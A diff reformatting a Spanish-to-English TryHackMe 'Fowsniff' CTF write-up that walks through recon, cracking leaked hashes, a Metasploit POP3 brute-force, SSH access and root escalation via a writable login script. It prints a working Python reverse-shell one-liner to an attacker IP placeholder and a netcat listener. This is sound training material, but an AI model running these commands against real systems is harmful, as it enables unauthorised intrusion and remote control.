@@ -1,65 +1,180 @@
-# 🧪 TryHackMe - [Fowsniff]
+# TryHackMe — Fowsniff CTF
 
-## 🎯 Objective
-
-Encontrar puertos abiertos, hacer busquedas online, crackear hashes, usar bruteforce, pop3 login y reverse shell
-
----
-
-## 🧠 What I learned
-
-- Busqueda de datos y reconocimiento
-- Telnet basico 
-- Busqueda y explotacion de vulnerabilidades
-- Conceptos y tecnicas de reverse shell
+**Platform:** TryHackMe  
+**Difficulty:** Easy/Medium  
+**Category:** OSINT · Bruteforce · Privilege Escalation  
+**Date:** 05/06/2026
 
 ---
 
-## 🔍 Methodology
+## Objective
+
+Gain root access to the Fowsniff machine by chaining together OSINT, credential cracking, POP3 bruteforce, and privilege escalation via a writable script executed at login.
+
+---
+
+## Tools Used
+
+|Tool|Purpose|
+|---|---|
+|Nmap|Port scanning and service enumeration|
+|Gobuster|Web directory enumeration|
+|CrackStation|Online MD5 hash cracking|
+|Metasploit (`scanner/pop3/pop3login`)|POP3 bruteforce|
+|Telnet|Manual POP3 interaction|
+|Netcat|Reverse shell listener|
+|Python3|Reverse shell payload|
+
+---
+
+## Methodology
 
 ### 1. Recon
 
-- Puertos
-	He usado nmap para encontrar que servicios hay abiertos y en que versiones corre
+Started with a full port scan to identify running services:
 
-- Directory Enumeration with Gobuster
-	- He usado gobuster para encontrar directorios ocultos en la web http
+```bash
+nmap -sV -sC -oN fowsniff.nmap <TARGET_IP>
+```
 
-### 2. Ennumeration
-- Puertos 22,80,110 y 143 abiertos. Esto es una mina de oro, tengo SSH, HTTP, POP3 e IMAP abiertos.
-- Varios directorios abiertos interesantes, entre ellos `security.txt`, el cual contenia dentro que la empresa fue 'pwn3d' por un usuario llamado 'B1gN1nj4'
+**Open ports:**
 
-### 3. Exploitation / Analysis
+|Port|Service|Notes|
+|---|---|---|
+|22|SSH|OpenSSH|
+|80|HTTP|Web server|
+|110|POP3|Mail service|
+|143|IMAP|Mail service|
 
-- Con una busqueda simple por Google con el nombre de la empresa encontre un repositorio de github del usuario 'B1gN1nj4' que leakeaba varios usuarios y sus hashes. Dice que son MD5 por lo que primero probe la manera mas sencilla, con una web. Me meti en `crackstation.net` y pegue todos los hashes. Consegui crackearlos todos menos uno.
-- Con las contrañas en texto plano, cree un archivo `USERPASS_FILE`, con los todos los nombres de usuario y sus contraseñas separados por un espacio. Probe a usar bruteforce con metasploit al login de pop3 con la herramienta `scanner/pop3/pop3login`. Use esta herramienta para probar todos los usuarios de manera rapida, asi no tenia que ir probandolos uno a uno manualmente. Añadi todos los datos que me pide obligatorios (IP, Puerto etc), y el archivo que habia creado con los usuarios y contraseñas. En la mayoria me dio error, pero en un usuario tuve exito. El user `seina`.
+Having SSH, HTTP, POP3 and IMAP open is a significant attack surface. POP3 and IMAP immediately suggest the possibility of harvesting credentials from emails.
 
-### 4. Findings
+Then ran Gobuster to enumerate hidden web directories:
 
-- Con telnet, me meti al pop3 con este user, dentro tenia 2 correos.
-- En un correo habla sobre que fueron hackeados, y dan una contraseña temporal de SSH.
+```bash
+gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
+```
 
-  ![Credenciales SSH filtradas en correo interno](./assets/fowsniff3.jpg)
+Found a `security.txt` file containing a message stating the company had been pwned by a user called `B1gN1nj4`.
 
-- Hay otro correo, parece inofensivo pero da una pista clave. Es del user 'baksteen' y habla sobre cosas personales. Le pregunta que si ha visto el correo de Stone, el dice que ya lo mirara porque cree que no sera nada importante, pero si lo es, porque en ese correo dice que es importante que cambien la contraseña, y el al no verla, no la cambio. Es cancha libre para entrar por SSH con la contraseña temporal.
+---
 
-   ![Banner corporativo y mensaje de seguridad](./assets/fowsniff2.jpg)
+### 2. OSINT
 
-- Al entrar por SSH en el user 'baksten' se ejecuta un script para ver una especie de imagen creada con caracteres con el logo de la empresa, el cual tengo permisos de escritura sobre el (una vulnerabilidad grave). Aproveche este error para inyectar una revserse shell en Python y que se ejecutase automaticamente al hacer login. La reverse shell basicamente abre una conexion desde la victima hacia mi equipo, y redirige la entrada y salia de la shell, con lo que puedo ejecutar comandos de forma remota. Al ejecutarse el script, consegui acceso como root.
+Searched Google for the company name (`Fowsniff`) combined with `B1gN1nj4`. Found a GitHub repository from that user containing a leaked file with employee usernames and their MD5 password hashes.
 
-> La reverse shell fue ejecutada con este comando: 
->
-> `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(<Attaker_IP>,<Attaker_Port>);os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
+> **Note:** I initially wasted time looking for the leaked data in obscure places. The answer was a straightforward Google search. Lesson: always start with the simplest approach.
 
-> Luego con `nc -lvnp <Attacker_Port>` escucho la shell de vuelta.
-![Escalada de privilegios exitosa a Root](./assets/fowsniff.png)
-## 🧠 Key takeaways
+Pasted all hashes into [CrackStation](https://crackstation.net). All hashes cracked successfully except one.
 
-- Al principio me complique mucho en buscar en sitios raros, cuando lo mas importante estaba en Google.
-- Me atasque un poco en el tema de entrar por ssh, tenia la contreseña pero no sabia que usuario probar. Me precipite al ver la contraseña y pensar que lo tenia todo, la respuesta que necesitaba estaba en ese segundo email.
-- Con la reverse shell tambien me perdi un poco, no sabia como iba pero busque informacion y me di cuenta de que tenia permisos de escritura sobre un script que se ejecutaba automatico, lo tenia ya todo. Buen aprendizaje aqui.
+---
 
-## 🚀 Conclusion
+### 3. Exploitation
 
-- Buena room, me gusta como esta estructurada. Me enseño a mirar todos los datos que recogi para analizarlos y sacar lo mas importante, tambien aprendi que a veces es mas facil de lo que parece, tenemos los datos delante y no los vemos, o con una simple busqueda en Google tenemos mucha informacion.
-- Tambien aprendi mucho sobre las reverse shell con esta room, como ejecutarlas y tambien incluso como proteger un sistema a ellas. Un script modificable por un usuario normal es un peligro importante.
+**POP3 Bruteforce with Metasploit**
+
+Built a `USERPASS_FILE` with all username/password combinations (one pair per line, space-separated), then launched the Metasploit POP3 login scanner:
+
+```bash
+msfconsole
+use scanner/pop3/pop3login
+set RHOSTS <TARGET_IP>
+set RPORT 110
+set USERPASS_FILE /path/to/userpass.txt
+run
+```
+
+Valid credentials found for user: `seina`
+
+**Accessing POP3 via Telnet**
+
+```bash
+telnet <TARGET_IP> 110
+USER seina
+PASS <password>
+LIST
+RETR 1
+RETR 2
+```
+
+Found two emails in the inbox:
+
+- **Email 1 (from Stone):** Notifies all staff about the breach and provides a temporary SSH password, asking everyone to change it immediately.
+    
+    ![SSH credentials leaked in internal email](./assets/fowsniff3.jpg)
+    
+- **Email 2 (from baksteen):** Baksteen replies to Stone's email saying he'll read it later — meaning he never saw the temporary password warning and never changed it. This gives us a valid SSH entry point.
+    
+
+> **Note:** I had the password from Email 1 but got stuck trying random usernames via SSH. I rushed past the second email assuming it was irrelevant. Going back and reading it carefully revealed that `baksteen` was the user who never changed his credentials. The answer was already in my hands, I just hadn't read everything.
+
+---
+
+### 4. Privilege Escalation
+
+SSH into the machine as `baksteen` using the temporary password:
+
+```bash
+ssh baksteen@<TARGET_IP>
+```
+
+Upon login, a Python script runs automatically, displaying an ASCII art banner. Checking permissions:
+
+
+![Corporate banner and security message](./assets/fowsniff2.jpg)
+
+
+```bash
+ls -la /path/to/script
+```
+
+The script is **owned by root but writable by the current user** — a critical misconfiguration. Any code injected here will execute as root on every login.
+
+> **Note:** I didn't immediately know how to proceed here. After researching reverse shells I realized the writable auto-run script was the vector, I already had everything I needed. Sometimes the path forward is already in front of you.
+
+Injected a Python reverse shell into the script:
+
+```python
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
+Started a listener on the attacker machine:
+
+```bash
+nc -lvnp <PORT>
+```
+
+Logged out and back in via SSH. The script executed automatically, triggering the reverse shell. Got a root shell.
+
+![Successful privilege escalation to root](./assets/fowsniff.png)
+
+---
+
+## Key Takeaways
+
+**OSINT before brute force.** The most valuable data (leaked credentials) was on a public GitHub repo, findable with a simple Google search. Always exhaust passive recon before reaching for active tools.
+
+**Read everything.** The second email looked irrelevant but contained the critical detail — baksteen hadn't changed his password. Missing it would have killed the attack chain.
+
+**File permissions matter.** A script executed automatically at login, writable by a non-root user, is a direct path to privilege escalation. Even if the file is owned by root, write permission for others breaks the security model entirely.
+
+---
+
+## Attack Chain Summary
+
+```
+Nmap → open ports (SSH, HTTP, POP3, IMAP)
+  ↓
+Gobuster → security.txt → company breached by B1gN1nj4
+  ↓
+OSINT (Google) → GitHub repo → leaked MD5 hashes
+  ↓
+CrackStation → plaintext passwords
+  ↓
+Metasploit POP3 bruteforce → valid creds (seina)
+  ↓
+Telnet POP3 → emails → temporary SSH password
+  ↓
+SSH as baksteen (never changed password)
+  ↓
+Writable login script → Python reverse shell → root
+```
